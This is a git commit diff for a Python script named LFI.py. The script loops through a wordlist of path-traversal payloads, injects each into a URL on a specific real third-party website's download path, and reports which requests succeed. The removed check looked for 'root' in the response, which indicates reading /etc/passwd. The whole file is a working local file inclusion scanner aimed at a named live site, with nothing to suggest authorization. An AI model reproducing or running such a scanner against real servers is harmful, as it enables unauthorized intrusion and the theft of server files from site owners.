f5dd9b8c120e5c972e3e986c4db6614a8ba5b21b
Marcus K <133644816+MarcusProgram@users.noreply.github.com>
2024-03-16 15:59:08 +0300

    Update LFI.py

--- LFI.py
+++ LFI.py
@@ -1,16 +1,17 @@
+#https://kpolyakov.spb.ru/download/
 import requests
 
 
 # [LFI]
-url = 'https://kpolyakov.spb.ru/[LFI]'
+url = 'https://kpolyakov.spb.ru/download[LFI]'
 
 with open('traversals-8-deep-exotic-encoding.txt', 'r') as f:
     for line in f.readlines():
         payload = line.strip()
         url_with_payload = url.replace('[LFI]', payload)
         r = requests.get(url_with_payload)
-        if 'root' in r.text:
-            print(f'Len: {len(r.content)}; Found: {payload}')
+        if r.status_code == 200:
+            print(f'Len: {len(r.content)}; Found: {payload}; Code: {r.status_code}; LINK {url+payload}')
             break
         else:
-            print(f'Len: {len(r.content)}; Not found: {payload}')
+            print(f'Len: {len(r.content)}; Not found: {payload}; Code: {r.status_code}; ')
